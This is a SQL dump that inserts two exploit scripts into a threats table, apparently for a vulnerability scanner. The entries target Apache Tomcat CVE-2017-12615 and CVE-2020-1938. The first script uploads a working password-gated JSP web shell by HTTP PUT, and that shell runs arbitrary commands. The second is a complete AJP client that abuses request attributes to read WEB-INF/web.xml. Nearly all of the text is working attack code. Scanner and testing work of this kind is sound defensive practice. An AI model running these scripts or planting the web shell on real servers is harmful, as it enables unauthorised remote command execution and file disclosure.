INSERT INTO `app_threats_db` VALUES (1, 'CVE-2017-12615', 'Tomcat PUT方法任意写文件漏洞', '1', 'import http.client\r\nimport sys\r\nimport time\r\nbody = \'\'\'<%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp\r\n+\"\\\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if(\"023\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\"))+\"</pre>\");}else{out.println(\":-)\");}%>\'\'\'\r\n\r\ndef run(host,port):\r\n    try:\r\n        url=str(host)+\':\'+str(port)\r\n        vurl=url\r\n        conn = http.client.HTTPConnection(url)\r\n        conn.request(method=\'OPTIONS\', url=\'/ffffzz\')\r\n        headers = dict(conn.getresponse().getheaders())\r\n        # print(headers)\r\n        if (\'Allow\' in headers and \\\r\n       headers[\'Allow\'].find(\'PUT\') > 0) or (\'allow\' in headers and \\\r\n       headers[\'allow\'].find(\'PUT\') > 0) :\r\n            conn.close()\r\n            conn = http.client.HTTPConnection(url)\r\n            url = \"/\" + str(int(time.time()))+\'.jsp/\'\r\n            conn.request( method=\'PUT\', url= url, body=body)\r\n            res = conn.getresponse()\r\n            # print(res)\r\n            if res.status  == 201 :\r\n                return (1,\'[+] [{}] is Vulnerable about cve_2017_12615! shell: {}\'.format(vurl,vurl+url[:-1]))\r\n            elif res.status == 204 :\r\n                return (1,\'[+] %s cve_2017_12615 file exists!\'%vurl)\r\n            else:\r\n                return (0,\'[-] %s seems no vuln about cve_2017_12615\'%vurl)\r\n            conn.close()\r\n        else:\r\n            return (0,\"[-] %s seems no vuln about cve_2017_12615\"%vurl)\r\n    except Exception:\r\n        return (0,\"[-] %s seems no vuln about cve_2017_12615!!\"%vurl)\r\n\r\n\r\n# host = \'localhost\'\r\n# port = \'8081\'\r\nresult = run(host,int(port))\r\nprint(result)\r\n    ', '2024-06-19 14:10:58', 'tomcat');
INSERT INTO `app_threats_db` VALUES (2, 'CVE-2020-1938', 'Aapache Tomcat AJP 文件包含漏洞', '1', '#!/usr/bin/env python3\r\n# _*_ coding:utf-8 _*_\r\nimport struct\r\nimport sys\r\nimport requests\r\nimport argparse\r\nimport socket\r\n\r\niplist=[]\r\niplist2=[]\r\niplist3=[]\r\nxxfile=\"WEB-INF/web.xml\"\r\ndef pack_string(s):\r\n    if s is None:\r\n        return struct.pack(\">h\", -1)\r\n    l = len(s)\r\n    return struct.pack(\">H%dsb\" % l, l, s.encode(\'utf8\'), 0)\r\ndef unpack(stream, fmt):\r\n    size = struct.calcsize(fmt)\r\n    buf = stream.read(size)\r\n    return struct.unpack(fmt, buf)\r\ndef unpack_string(stream):\r\n    size, = unpack(stream, \">h\")\r\n    if size == -1: # null string\r\n        return None\r\n    res, = unpack(stream, \"%ds\" % size)\r\n    stream.read(1) # \\0\r\n    return res\r\nclass NotFoundException(Exception):\r\n    pass\r\nclass AjpBodyRequest(object):\r\n    # server == web server, container == servlet\r\n    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\r\n    MAX_REQUEST_LENGTH = 8186\r\n    def __init__(self, data_stream, data_len, data_direction=None):\r\n        self.data_stream = data_stream\r\n        self.data_len = data_len\r\n        self.data_direction = data_direction\r\n    def serialize(self):\r\n        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)\r\n        if len(data) == 0:\r\n            return struct.pack(\">bbH\", 0x12, 0x34, 0x00)\r\n        else:\r\n            res = struct.pack(\">H\", len(data))\r\n            res += data\r\n        if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:\r\n            header = struct.pack(\">bbH\", 0x12, 0x34, len(res))\r\n        else:\r\n            header = struct.pack(\">bbH\", 0x41, 0x42, len(res))\r\n        return header + res\r\n    def send_and_receive(self, socket, stream):\r\n        while True:\r\n            data = self.serialize()\r\n            socket.send(data)\r\n            r = AjpResponse.receive(stream)\r\n            while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:\r\n                r = AjpResponse.receive(stream)\r\n\r\n            if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:\r\n                break\r\nclass AjpForwardRequest(object):\r\n    _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)\r\n    REQUEST_METHODS = {\'GET\': GET, \'POST\': POST, \'HEAD\': HEAD, \'OPTIONS\': OPTIONS, \'PUT\': PUT, \'DELETE\': DELETE, \'TRACE\': TRACE}\r\n    # server == web server, container == servlet\r\n    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\r\n    COMMON_HEADERS = [\"SC_REQ_ACCEPT\",\r\n        \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\",\r\n        \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\",\r\n        \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\"\r\n    ]\r\n    ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"]\r\n    def __init__(self, data_direction=None):\r\n        self.prefix_code = 0x02\r\n        self.method = None\r\n        self.protocol = None\r\n        self.req_uri = None\r\n        self.remote_addr = None\r\n        self.remote_host = None\r\n        self.server_name = None\r\n        self.server_port = None\r\n        self.is_ssl = None\r\n        self.num_headers = None\r\n        self.request_headers = None\r\n        self.attributes = None\r\n        self.data_direction = data_direction\r\n    def pack_headers(self):\r\n        self.num_headers = len(self.request_headers)\r\n        res = \"\"\r\n        res = struct.pack(\">h\", self.num_headers)\r\n        for h_name in self.request_headers:\r\n            if h_name.startswith(\"SC_REQ\"):\r\n                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1\r\n                res += struct.pack(\"BB\", 0xA0, code)\r\n            else:\r\n                res += pack_string(h_name)\r\n\r\n            res += pack_string(self.request_headers[h_name])\r\n        return res\r\n\r\n    def pack_attributes(self):\r\n        res = b\"\"\r\n        for attr in self.attributes:\r\n            a_name = attr[\'name\']\r\n            code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1\r\n            res += struct.pack(\"b\", code)\r\n            if a_name == \"req_attribute\":\r\n                aa_name, a_value = attr[\'value\']\r\n                res += pack_string(aa_name)\r\n                res += pack_string(a_value)\r\n            else:\r\n                res += pack_string(attr[\'value\'])\r\n        res += struct.pack(\"B\", 0xFF)\r\n        return res\r\n    def serialize(self):\r\n        res = \"\"\r\n        res = struct.pack(\"bb\", self.prefix_code, self.method)\r\n        res += pack_string(self.protocol)\r\n        res += pack_string(self.req_uri)\r\n        res += pack_string(self.remote_addr)\r\n        res += pack_string(self.remote_host)\r\n        res += pack_string(self.server_name)\r\n        res += struct.pack(\">h\", self.server_port)\r\n        res += struct.pack(\"?\", self.is_ssl)\r\n        res += self.pack_headers()\r\n        res += self.pack_attributes()\r\n        if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:\r\n            header = struct.pack(\">bbh\", 0x12, 0x34, len(res))\r\n        else:\r\n            header = struct.pack(\">bbh\", 0x41, 0x42, len(res))\r\n        return header + res\r\n    def parse(self, raw_packet):\r\n        stream = StringIO(raw_packet)\r\n        self.magic1, self.magic2, data_len = unpack(stream, \"bbH\")\r\n        self.prefix_code, self.method = unpack(stream, \"bb\")\r\n        self.protocol = unpack_string(stream)\r\n        self.req_uri = unpack_string(stream)\r\n        self.remote_addr = unpack_string(stream)\r\n        self.remote_host = unpack_string(stream)\r\n        self.server_name = unpack_string(stream)\r\n        self.server_port = unpack(stream, \">h\")\r\n        self.is_ssl = unpack(stream, \"?\")\r\n        self.num_headers, = unpack(stream, \">H\")\r\n        self.request_headers = {}\r\n        for i in range(self.num_headers):\r\n            code, = unpack(stream, \">H\")\r\n            if code > 0xA000:\r\n                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]\r\n            else:\r\n                h_name = unpack(stream, \"%ds\" % code)\r\n                stream.read(1) # \\0\r\n            h_value = unpack_string(stream)\r\n            self.request_headers[h_name] = h_value\r\n    def send_and_receive(self, socket, stream, save_cookies=False):\r\n        res = []\r\n        i = socket.sendall(self.serialize())\r\n        if self.method == AjpForwardRequest.POST:\r\n            return res\r\n\r\n        r = AjpResponse.receive(stream)\r\n        assert r.prefix_code == AjpResponse.SEND_HEADERS\r\n        res.append(r)\r\n        if save_cookies and \'Set-Cookie\' in r.response_headers:\r\n            self.headers[\'SC_REQ_COOKIE\'] = r.response_headers[\'Set-Cookie\']\r\n\r\n        # read body chunks and end response packets\r\n        while True:\r\n            r = AjpResponse.receive(stream)\r\n            res.append(r)\r\n            if r.prefix_code == AjpResponse.END_RESPONSE:\r\n                break\r\n            elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:\r\n                continue\r\n            else:\r\n                raise NotImplementedError\r\n                break\r\n\r\n        return res\r\n\r\nclass AjpResponse(object):\r\n    _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)\r\n    COMMON_SEND_HEADERS = [\r\n            \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\",\r\n            \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\"\r\n            ]\r\n    def parse(self, stream):\r\n        # read headers\r\n        self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\")\r\n\r\n        if self.prefix_code == AjpResponse.SEND_HEADERS:\r\n            self.parse_send_headers(stream)\r\n        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:\r\n            self.parse_send_body_chunk(stream)\r\n        elif self.prefix_code == AjpResponse.END_RESPONSE:\r\n            self.parse_end_response(stream)\r\n        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:\r\n            self.parse_get_body_chunk(stream)\r\n        else:\r\n            raise NotImplementedError\r\n\r\n    def parse_send_headers(self, stream):\r\n        self.http_status_code, = unpack(stream, \">H\")\r\n        self.http_status_msg = unpack_string(stream)\r\n        self.num_headers, = unpack(stream, \">H\")\r\n        self.response_headers = {}\r\n        for i in range(self.num_headers):\r\n            code, = unpack(stream, \">H\")\r\n            if code <= 0xA000: # custom header\r\n                h_name, = unpack(stream, \"%ds\" % code)\r\n                stream.read(1) # \\0\r\n                h_value = unpack_string(stream)\r\n            else:\r\n                h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]\r\n                h_value = unpack_string(stream)\r\n            self.response_headers[h_name] = h_value\r\n\r\n    def parse_send_body_chunk(self, stream):\r\n        self.data_length, = unpack(stream, \">H\")\r\n        self.data = stream.read(self.data_length+1)\r\n\r\n    def parse_end_response(self, stream):\r\n        self.reuse, = unpack(stream, \"b\")\r\n\r\n    def parse_get_body_chunk(self, stream):\r\n        rlen, = unpack(stream, \">H\")\r\n        return rlen\r\n\r\n    @staticmethod\r\n    def receive(stream):\r\n        r = AjpResponse()\r\n        r.parse(stream)\r\n        return r\r\n\r\nimport socket\r\n\r\ndef prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):\r\n    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)\r\n    fr.method = method\r\n    fr.protocol = \"HTTP/1.1\"\r\n    fr.req_uri = req_uri\r\n    fr.remote_addr = target_host\r\n    fr.remote_host = None\r\n    fr.server_name = target_host\r\n    fr.server_port = 80\r\n    fr.request_headers = {\r\n        \'SC_REQ_ACCEPT\': \'text/html\',\r\n        \'SC_REQ_CONNECTION\': \'keep-alive\',\r\n        \'SC_REQ_CONTENT_LENGTH\': \'0\',\r\n        \'SC_REQ_HOST\': target_host,\r\n        \'SC_REQ_USER_AGENT\': \'Mozilla\',\r\n        \'Accept-Encoding\': \'gzip, deflate, sdch\',\r\n        \'Accept-Language\': \'en-US,en;q=0.5\',\r\n        \'Upgrade-Insecure-Requests\': \'1\',\r\n        \'Cache-Control\': \'max-age=0\'\r\n    }\r\n    fr.is_ssl = False\r\n    fr.attributes = []\r\n    return fr\r\n\r\nclass Tomcat(object):\r\n    def __init__(self, target_host, target_port):\r\n        self.target_host = target_host\r\n        self.target_port = target_port\r\n\r\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n        self.socket.connect((target_host, target_port))\r\n        # self.stream = self.socket.makefile(\"rb\", bufsize=0)\r\n        self.stream = self.socket.makefile(\"rb\")\r\n\r\n    def perform_request(self, req_uri, headers={}, method=\'GET\', user=None, password=None, attributes=[]):\r\n        self.req_uri = req_uri\r\n        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))\r\n        #print(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri))\r\n        if user is not None and password is not None:\r\n            self.forward_request.request_headers[\'SC_REQ_AUTHORIZATION\'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode(\'base64\').replace(\'\\n\', \'\')\r\n        for h in headers:\r\n            self.forward_request.request_headers[h] = headers[h]\r\n        for a in attributes:\r\n            self.forward_request.attributes.append(a)\r\n        responses = self.forward_request.send_and_receive(self.socket, self.stream)\r\n        if len(responses) == 0:\r\n            return None, None\r\n        snd_hdrs_res = responses[0]\r\n        data_res = responses[1:-1]\r\n        if len(data_res) == 0:\r\n            print(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers)\r\n        return snd_hdrs_res, data_res\r\n\r\n\'\'\'\r\njavax.servlet.include.request_uri\r\njavax.servlet.include.path_info\r\njavax.servlet.include.servlet_path\r\n\'\'\'\r\n\r\n\r\ndef islive(url,port):\r\n    sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\n    sk.settimeout(1)\r\n    try:\r\n        sk.connect((url,8009))\r\n        # print(\'%s server port 8009 open!\'%url)\r\n        return 1\r\n    except Exception:\r\n        print(\'[-] %s seems no vuln about cve_2020_1938\'%url)\r\n        pass\r\n    sk.close()\r\n\r\n\r\ndef run(url,port):\r\n    if islive(url,port)==1:\r\n        try:\r\n            t = Tomcat(url, 8009)\r\n            _,data = t.perform_request(\'/asdf\',attributes=[\r\n                {\'name\':\'req_attribute\',\'value\':[\'javax.servlet.include.request_uri\',\'/\']},\r\n                {\'name\':\'req_attribute\',\'value\':[\'javax.servlet.include.path_info\',xxfile]},\r\n                {\'name\':\'req_attribute\',\'value\':[\'javax.servlet.include.servlet_path\',\'/\']},\r\n                ])\r\n            return (1,\'[+] [%s] is Vulnerable to cve_2020_1938 !\'%url)\r\n            #print(\"\".join([str(d.data) for d in data]))\r\n        except:\r\n            return (0,\'[-] %s seems no vuln to cve_2020_1938111111\'%url)\r\n    return (0,\'[-] %s seems no vuln to cve_2020_1938\'%url)\r\n\r\n\r\n# host = \'localhost\'\r\n# port = \'8081\'\r\nresult = run(host,int(port))\r\nprint(result)\r\n', '2024-06-04 14:15:43', 'tomcat');
